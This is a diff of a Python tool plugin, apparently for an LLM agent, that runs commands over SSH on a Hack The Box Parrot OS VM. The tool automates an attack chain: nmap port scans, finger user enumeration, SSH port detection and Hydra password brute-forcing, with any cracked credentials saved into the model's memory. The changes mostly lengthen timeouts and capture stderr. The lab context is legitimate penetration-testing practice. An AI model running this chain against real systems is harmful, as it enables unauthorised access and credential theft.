@@ -1,7 +1,7 @@
 """
 title: SSH Command Executor
 author: Ella Duffy
-version: 1.2.2
+version: 1.2.3
 description: Executes commands on my remote HTB Parrot OS VM and returns the output, with logging.
 """
 
@@ -19,18 +19,17 @@ logging.basicConfig(
     level=logging.INFO,
     format='%(asctime)s - %(levelname)s - %(message)s',
     handlers=[
-        #logging.FileHandler('/app/logs/ssh_executor.log'),  # Save logs to file - for OpenWebUI
         logging.FileHandler('logs/ssh_executor.log'),
         logging.StreamHandler()  # Also print to console
     ]
 )
 logger = logging.getLogger(__name__)
 
-logger.info("Loading SSH Command Executor") #using logging module over print statements for flexibility and control
+logger.info("Loading SSH Command Executor")
 
 class Tools:
     def __init__(self, memory: ChatMessageHistory = None):
-        self.memory = memory if memory is not None else ChatMessageHistory() #Initialize or use provided memory
+        self.memory = memory if memory is not None else ChatMessageHistory()
 
     @contextmanager
     def ssh_client(self, host: str, username: str, timeout: int = 300):
@@ -45,14 +44,17 @@ class Tools:
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
-            client.connect(host, username=username, key_filename="/Users/elladuffy/.ssh/id_rsa", passphrase=os.environ.get("SSH_PASSPHRASE")) #key_filename = "/app/tools/id_rsa"  -- for Open WebUI
+            client.connect(host, username=username, key_filename="/Users/elladuffy/.ssh/id_rsa", 
+                          passphrase=os.environ.get("SSH_PASSPHRASE"), timeout=timeout)
+            logger.info(f"SSH connection established to {host}")
             yield client
         except Exception as e:
             logger.error(f"SSH connection error: {str(e)}")
             raise
         finally:
             client.close()
-    
+            logger.info(f"SSH connection to {host} closed")
+
     def ssh_command_executor(self, host: str, username: str, command: str, timeout: int = 300) -> str:
         """
         Execute a command on my remote HTB Parrot OS VM using the SSH agent for authentication.
@@ -62,41 +64,66 @@ class Tools:
             username (str): The SSH username (e.g., 'parrot' or 'user').
             command (str): The command to execute (e.g., 'whoami').
             timeout (int): Maximum execution time in seconds (default: 300).
-    
+
         Returns:
             str: The output of the command (stdout + stderr).
 
         Raises:
             ValueError: If the SSH_PASSPHRASE environment variable is not set.
         """
+        # Increase timeout for Hydra commands
+        if "hydra" in command.lower():
+            timeout = max(timeout, 600)  # 10 minutes for Hydra attack
+            logger.info(f"Increased timeout to {timeout} seconds for Hydra command")
+
         logger.info(f"Connecting to {host} as {username}")
         passphrase = os.environ.get("SSH_PASSPHRASE")
         if not passphrase:
             logger.error("SSH_PASSPHRASE environment variable not set")
             raise ValueError("SSH_PASSPHRASE environment variable not set")
+        
         try:
             start_time = time.time()
             with self.ssh_client(host, username, timeout) as client:
                 full_command = f"PATH=$PATH:/sbin:/usr/sbin {command}"
                 logger.info(f"Executing command: {full_command}")
                 channel = client.get_transport().open_session()
-                channel.settimeout(timeout)
                 channel.exec_command(full_command)
                 output = []
+                stderr_output = []
+                
+                # Capture both stdout and stderr incrementally
                 while not channel.exit_status_ready():
                     if channel.recv_ready():
-                        output.append(channel.recv(1024).decode())
-                    time.sleep(0.1)  # Brief pause to avoid busy-waiting
+                        data = channel.recv(4096).decode()  # Increased buffer size
+                        output.append(data)
+                        logger.debug(f"Received stdout chunk: {data[:100]}...")  # Log first 100 chars
+                    if channel.recv_stderr_ready():
+                        error = channel.recv_stderr(4096).decode()
+                        stderr_output.append(error)
+                        logger.debug(f"Received stderr chunk: {error[:100]}...")  # Log first 100 chars
+                    time.sleep(0.2)  # Slightly longer pause to reduce CPU usage
                     if time.time() - start_time > timeout:
                         logger.warning(f"Command timed out after {timeout} seconds")
                         channel.close()
                         raise TimeoutError(f"Command timed out after {timeout} seconds")
-                if channel.recv_stderr_ready():
-                    error = channel.recv_stderr(1024).decode()
-                    if error:
-                        logger.warning(f"Command stderr: {error.strip()}")
-                        output.append(error)
+
+                # Capture any remaining output
+                while channel.recv_ready():
+                    output.append(channel.recv(4096).decode())
+                while channel.recv_stderr_ready():
+                    stderr_output.append(channel.recv_stderr(4096).decode())
+
+                # Check exit status
+                exit_status = channel.recv_exit_status()
+                logger.info(f"Command exit status: {exit_status}")
+
                 result = "".join(output).strip()
+                error_result = "".join(stderr_output).strip()
+                if error_result:
+                    logger.warning(f"Command stderr: {error_result}")
+                    result += "\n" + error_result  # Append stderr for full context
+                
                 logger.info(f"Command output:\n{result}")
                 return result
         except paramiko.SSHException as e:
@@ -119,9 +146,10 @@ class Tools:
             dict: Dictionary of port:service pairs.
         """
         logger.info(f"Scanning open ports on {target}")
-        command = f"nmap -p1-1000,22022 {target} --max-retries 2 -Pn --max-rate 50 --open"
+        # Use smaller port range for debugging
+        command = f"nmap -p1-1000,22022 {target} --max-retries 2 -Pn --open"
         try:
-            output = self.ssh_command_executor(host, username, command)
+            output = self.ssh_command_executor(host, username, command, timeout=600)
             ports = {}
             for line in output.splitlines():
                 match = re.search(r"(\d+)/tcp\s+open\s+(\w+)", line)
@@ -129,14 +157,13 @@ class Tools:
                     port, service = match.groups()
                     ports[port] = service
             logger.info(f"Scanned ports: {ports}")
-            #Store these results in memory
             self.memory.add_message({"role": "assistant", "content": f"Scanned ports on {target}: {ports}"})
             return ports
         except Exception as e:
             logger.error(f"Port scan failed: {str(e)}")
             self.memory.add_message({"role": "assistant", "content": f"Port scan failed on {target}: {str(e)}"})
             return {}
-    
+
     def enumerate_users(self, host: str, username: str, target: str, wordlist="/usr/share/seclists/Usernames/Names/names.txt") -> List[str]:
         """
         Enumerate users on the remote host using finger via SSH.
@@ -176,8 +203,7 @@ class Tools:
             logger.error(f"User enumeration failed: {str(e)}")
             self.memory.add_message({"role": "assistant", "content": f"User enumeration failed on {target}: {str(e)}"})
             return []
-        
-    
+
     def detect_ssh_port(self, host: str, username: str, target: str) -> Optional[int]:
         """
         Detect the port running SSH on the target host using nmap, so we can adequately brute force the service. 
@@ -192,11 +218,9 @@ class Tools:
         """
         logger.info(f"Detecting SSH port on {target}")
         try:
-            #Check LLM memory first
             memory_content = "\n".join(msg["content"] for msg in self.memory.messages if "content" in msg)
             logger.info(f"Checking memory... \n: {memory_content}")
 
-            #Look for previously detected SSH port
             match = re.search(r"SSH detected on port: (\d+)", memory_content)
             if match:
                 port = int(match.group(1))
@@ -204,21 +228,20 @@ class Tools:
                 self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port} (from memory)"})
                 return port
             
-            # Parse scan_ports memory to find potential SSH ports
             scan_match = re.search(r"Scanned ports on " + re.escape(target) + r":\s*({[^}]*})", memory_content)
             if scan_match:
                 ports_str = scan_match.group(1).strip()
                 try:
                     ports = ast.literal_eval(ports_str)
                     for port, service in ports.items():
-                        if service.lower() in ["ssh", "openssh"]: #Trust what was found by scan_port tool
+                        if service.lower() in ["ssh", "openssh"]:
                             logger.info(f"SSH port {port} found in scan_ports memory with service {service}.")
                             self.memory.add_message({"role": "assistant", "content": f"SSH detected on port: {port}"})
                             return int(port)
                         elif service.lower() == "unknown":
                             logger.info(f"Probing unknown service on memory port {port} for SSH.")
                             probe_cmd = f"nmap -p {port} -sC -sV {target}"
-                            output = self.ssh_command_executor(host, username, probe_cmd)
+                            output = self.ssh_command_executor(host, username, probe_cmd, timeout=600)
                             if "ssh" in output.lower():
                                 detected_port = int(port)
                                 logger.info(f"SSH confirmed on probed port: {detected_port}")
@@ -227,10 +250,9 @@ class Tools:
                 except (ValueError, SyntaxError) as e:
                     logger.error(f"Failed to parse ports string '{ports_str}': {str(e)}")
             
-            # No memory run fast SSH-specific scan on typical ports
             logger.info("No memory data, running fast nmap scan.")
             fast_scan_cmd = f"nmap -p 22,22022,2222,22222 -sC -sV {target}"
-            output = self.ssh_command_executor(host, username, fast_scan_cmd)
+            output = self.ssh_command_executor(host, username, fast_scan_cmd, timeout=600)
             ssh_port = None
             for line in output.splitlines():
                 match = re.search(r"(\d+)/tcp\s+open\s+ssh", line)
@@ -250,7 +272,7 @@ class Tools:
             logger.error(f"Error detecting SSH port: {str(e)}")
             self.memory.add_message({"role": "assistant", "content": f"Error detecting SSH port on {target}: {str(e)}"})
             return None
-        
+
     def run_hydra_attack(self, host: str, username: str, target: str, target_username: str, password_file: str, port: int = 22, protocol: str = "ssh") -> Dict[str, str]:
         """
         Run a Hydra password attack on the target using the specified username and password list.
@@ -270,20 +292,17 @@ class Tools:
         logger.info(f"Starting Hydra attack on {target} for {target_username} with port {port}")
         command = f"hydra -l {target_username} -P {password_file} {protocol}://{target} -s {port}"
         try:
-            # Execute Hydra command via SSH on the host VM
-            output = self.ssh_command_executor(host, username, command)
-            # Parse output for successful login with improved logic
+            output = self.ssh_command_executor(host, username, command, 600)
             credentials = {}
             for line in output.splitlines():
                 if "[ssh]" in line and "login:" in line and "password:" in line:
-                    # Extract username and password from the line
                     login_index = line.index("login:") + len("login:")
                     password_index = line.index("password:")
                     cred_user = line[login_index:password_index].strip()
                     cred_pass = line[password_index + len("password:"):].strip()
                     if cred_user and cred_pass:
                         credentials[cred_user] = cred_pass
-                        break  # Stop after first success (adjust if multiple logins possible)
+                        break
             if credentials:
                 self.memory.add_message({"role": "assistant", "content": f"Hydra success: {credentials} on {target}"})
                 return credentials
@@ -294,8 +313,7 @@ class Tools:
         except Exception as e:
             logger.error(f"Hydra attack failed: {str(e)}")
             self.memory.add_message({"role": "assistant", "content": f"Hydra failed on {target}: {str(e)}"})
-        return {}
-        
+            return {}
 
     def main(self, host: str, username: str, target: str):
         logger.info(f"Starting attack chain on {target} via {host}")
